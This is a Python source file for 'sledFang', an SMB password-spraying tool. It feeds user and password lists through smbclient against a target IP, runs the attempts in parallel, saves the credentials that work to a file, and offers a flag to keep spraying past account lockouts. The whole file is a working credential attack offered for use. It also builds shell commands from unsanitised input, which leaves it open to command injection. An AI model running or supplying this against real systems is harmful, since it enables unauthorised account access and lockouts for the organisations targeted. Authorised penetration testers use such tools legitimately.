#! python3
# sledFang.py -v 1.3
# Author- David Sullivan
#
# Use smbclient to password spray against a device
#
# Revision  1.0     -   07/09/2018- Initial creation of script
# Revision  1.1     -   04/24/2019- Added rate limiting and delays, logic for reset connections, renamed to 'sledFang',
#                                   added verbosity as well.
# Revision  1.2     -   06/03/2019- Added new false positive, updated output to not write duplicates, added logic to
#                                   not continue spraying against locked out account when the bypass option is used.
# Revision  1.3     -   07/19/2019- Added colorized output, better error handling, multiprocessing
#
# Example Usage:
# python3 sledFang.py -d domain -u user -p password -t 127.0.0.1 -o output.txt
# python3 sledFang.py -d domain -U userlist.txt -P passwordlist.txt -t 127.0.0.1 -o output.txt

import subprocess, argparse, time, multiprocessing
# from datetime import datetime
from functools import partial


# startTime = datetime.now()


# chunk the user list so it can run in parallel while spraying
def chunkUsers(seq, num):
    avg = len(seq) / float(num)
    out = []
    last = 0.0

    while last < len(seq):
        out.append(seq[int(last):int(last + avg)])
        last += avg

    return out


def write_output(user, password, output):
    # create an empty list to store credentials and a variable for the new credential
    creds = list()
    new_cred = '%s:%s\n' % (user, password)

    # open the output file, check to see if the new credential has already been found, if not, add to file
    try:
        file = open(output, 'r+')
        for cred in file:
            creds.append(cred)
        file.close()
        file = open(output, 'a+')
        if new_cred not in creds:
            file.write(new_cred)
        file.close()
    except:
        file = open(output, 'a+')
        if new_cred not in creds:
            file.write(new_cred)
        file.close()


# new print statement for being able to print in varying colors
def printColor(color_input, color):
    if color == 'red':
        print("\033[91m {}\033[00m".format(color_input))
    elif color == 'green':
        print("\033[92m {}\033[00m".format(color_input))
    elif color == 'yellow':
        print("\033[93m {}\033[00m".format(color_input))
    else:
        print(color_input)


# this function allows the user spraying to be multi-threaded
def user_attack(user_list, domain, target_ip, output, bypass, verbose, very_verbose, password, user_list_clean,
                temp_users, rate_limit, threading):

    # check if multiprocessing is being used, if so
    if threading > 0:
        # create a pool and chunk the user list based on the number of cores, setup the command for the map function
        pool = multiprocessing.Pool(processes=threading)
        chunked_user_list = chunkUsers(user_list, threading)
        user_command = partial(attack, domain, target_ip, output, bypass, verbose, very_verbose, password, 
                               user_list_clean, temp_users)

        # run the for loop attack using the threaded rules
        for user in chunked_user_list:
            pool.map_async(user_command, user)
        pool.close()
        pool.join()

    # if threading is not being used just run the attack without multiprocessing
    else:
        for user in user_list:
            attack(domain, target_ip, output, bypass, verbose, very_verbose, password, user_list_clean, temp_users,
                   user)
            time.sleep(rate_limit)


# this function is the actual password attack
def attack(domain, target_ip, output, bypass, verbose, very_verbose, password, user_list_clean, temp_users, user):
    # build the command line argument for smbclient
    arguments = 'smbclient -U "%s\%s%%%s" -L %s' % (domain, user, password, target_ip)
    # print command if verbosity is turned on
    if very_verbose:
        print(arguments)
    # send the command line query and pipe the response to standard out
    response = subprocess.Popen(arguments, shell=True, stdout=subprocess.PIPE).stdout
    # decode the response as a string
    answer = (response.read()).decode()
    # print response if verbosity is turned on
    if verbose or very_verbose:
        print(answer)
    # check to see if the server can be connected to, if not, stop the script
    if answer == "Connection to %s failed (Error was NT_STATUS_CONNECTION_REFUSED)\n" % target_ip:
        printColor("[-] Unable to connect to server", "red")
        quit()
    elif answer == "Connection to %s failed (Error was NT_STATUS_IO_TIMEOUT)\n" % target_ip:
        printColor("[-] Unable to connect to server", "red")
        quit()
    elif answer == "Connection to %s failed (Error NT_STATUS_IO_TIMEOUT)\n" % target_ip:
        printColor("[-] Unable to connect to server", "red")
        quit()
    elif answer == "Connection to %s failed (Error NT_STATUS_UNSUCCESSFUL)\n" % target_ip:
        printColor("[-] Unable to connect to server", "red")
        quit()
    elif answer == "":
        printColor("[-] Unable to connect to server", "red")
        quit()
    # check to see if logon attempts are being throttled, if so stop the sprayer
    elif answer == "session setup failed: NT_STATUS_CONNECTION_RESET\n":
        printColor("[-] Connection reset, too many connections attempt, please increase rate limit", "red")
        printColor(("[*] Stopped at user %s" % user), "yellow")
        quit()
    # check to see if the account is expired, if so, print out the account and remove from spraying list
    elif answer == "session setup failed: NT_STATUS_PASSWORD_EXPIRED\n":
        printColor(("[-] " + answer.replace("\n", "") + " using the account " + user + " and the password " + password),
                   "red")
        temp_users.remove(user)
    # check to see if the account is disabled if so, print out the account and remove from spraying list
    elif answer == "session setup failed: NT_STATUS_ACCOUNT_DISABLED\n":
        printColor(("[-] " + answer.replace("\n", "") + " using the account " + user + " and the password " + password),
                   "red")
        temp_users.remove(user)
    # check to see if the account is restricted if so, print out the account and remove from spraying list
    elif answer == "session setup failed: NT_STATUS_ACCOUNT_RESTRICTION\n":
        printColor(("[-] " + answer.replace("\n", "") + " using the account " + user + " and the password " + password),
                   "red")
        temp_users.remove(user)
    # check to see if the account has been locked out, if so
    elif answer == "session setup failed: NT_STATUS_ACCOUNT_LOCKED_OUT\n":
        printColor(("[-] " + answer.replace("\n", "") + " using the account " + user + " and the password " + password),
                   "red")
        user_diff = set(user_list_clean) - set(temp_users)
        # check to see if the bypass flag is set, if not, stop spraying
        if bypass is not True:
            printColor("[*] Stopping script due to account lockout", "yellow")
            printColor("[*] The following accounts are expired, disabled or cracked:", "yellow")
            print(user_diff)
            quit()
        # if the bypass flag is set, remove the locked out account from the spraying queue
        else:
            temp_users.remove(user)
    # if logon fails, drop the response, any other response, print to screen and remove account from spraying
    elif answer != "session setup failed: NT_STATUS_LOGON_FAILURE\n":
        if answer != "session setup failed: NT_STATUS_ACCESS_DENIED\n":
            printColor(("[+] The account %s was successfully logged into using the password %s" % (user, password)),
                       "green")
            temp_users.remove(user)
            # write password to file
            if output is not None:
                write_output(user, password, output)


# this function takes all the command line arguments and starts the spraying attack
def sprayer(domain, user_list, password_list, target_ip, output, bypass, rate_limit, delay, verbose, very_verbose,
            threading):
    # loop through each set of passwords, spraying each user
    print("Running")
    # remove the new line character from the users
    user_list_clean = []
    for user in user_list:
        user = user.replace("\n", "")
        user_list_clean.append(user)
    # remove the new line character from the passwords
    password_list_clean = []
    for password in password_list:
        password = password.replace("\n", "")
        password_list_clean.append(password)

    # create a copy of the user list to remove users if the correct password is found, or the account gets locked
    temp_users = user_list_clean[:]
    for password in password_list_clean:
        time.sleep(delay)
        printColor(("Spraying using %s" % password), "yellow")
        # update the user_list based on found passwords or locked accounts
        user_list = temp_users[:]
        user_attack(user_list, domain, target_ip, output, bypass, verbose, very_verbose, password, user_list_clean,
                    temp_users, rate_limit, threading)
    print("Complete")


if __name__ == '__main__':
    # parse input for variables
    parser = argparse.ArgumentParser(description='SMB Password Sprayer')
    parser.add_argument('-d', '--domain', help='Domain name')
    parser.add_argument('-U', '--userlist', help='Location of users list')
    parser.add_argument('-u', '--user', help='Use a single user name')
    parser.add_argument('-P', '--passwordlist', help='Location of passwords list')
    parser.add_argument('-p', '--password', help='Use a single password')
    parser.add_argument('-t', '--target', help='Target IP address')
    parser.add_argument('-r', '--rate', help='Time between each user login (in seconds)')
    parser.add_argument('-D', '--delay', help='Time between each password tried (in minutes)')
    parser.add_argument('-o', '--output', help='Output file name')
    parser.add_argument('-b', '--bypass', action='store_true', help='Bypass locked accounts')
    parser.add_argument('-v', '--verbose', action='store_true', help='Show Responses')
    parser.add_argument('-V', '--very_verbose', action='store_true', help='Show Requests and Responses')
    parser.add_argument('-T', '--threading', nargs='?', default=False, const=int(multiprocessing.cpu_count()),
                        help='Set number of parallel threads to spray')

    args = parser.parse_args()

    # set list of users
    users = []
    if args.userlist is not None:
        users_doc = args.userlist
        users_import = open(users_doc, 'r')
        for usr in users_import:
            users.append(usr)
    if args.user is not None:
        users.append(args.user)

    # set list of passwords
    passwords = []
    if args.passwordlist is not None:
        passwords_doc = args.passwordlist
        passwords_import = open(passwords_doc, 'r')
        for pw in passwords_import:
            passwords.append(pw)
    if args.password is not None:
        passwords.append(args.password)

    # select target
    target = args.target

    # select domain
    domain = args.domain

    # set threading limit
    if int(args.threading) < int(multiprocessing.cpu_count()):
        threading = int(args.threading)
    elif not args.threading:
        threading = False
    else:
        threading = int(multiprocessing.cpu_count())

    # set rate_limit
    if args.rate is not None:
        rate_limit = int(args.rate)
        threading = False
    else:
        rate_limit = 0

    # set delay
    if args.delay is not None:
        delay = int(args.delay) * 60
    else:
        delay = 0

    # select output
    if args.output is not None:
        output = args.output
    else:
        output = None

    # bypass boolean
    bypass = args.bypass

    # turn on verbosity
    verbose = args.verbose
    very_verbose = args.very_verbose

    # run the program
    sprayer(domain, users, passwords, target, output, bypass, rate_limit, delay, verbose, very_verbose, threading)
    # print(datetime.now() - startTime)
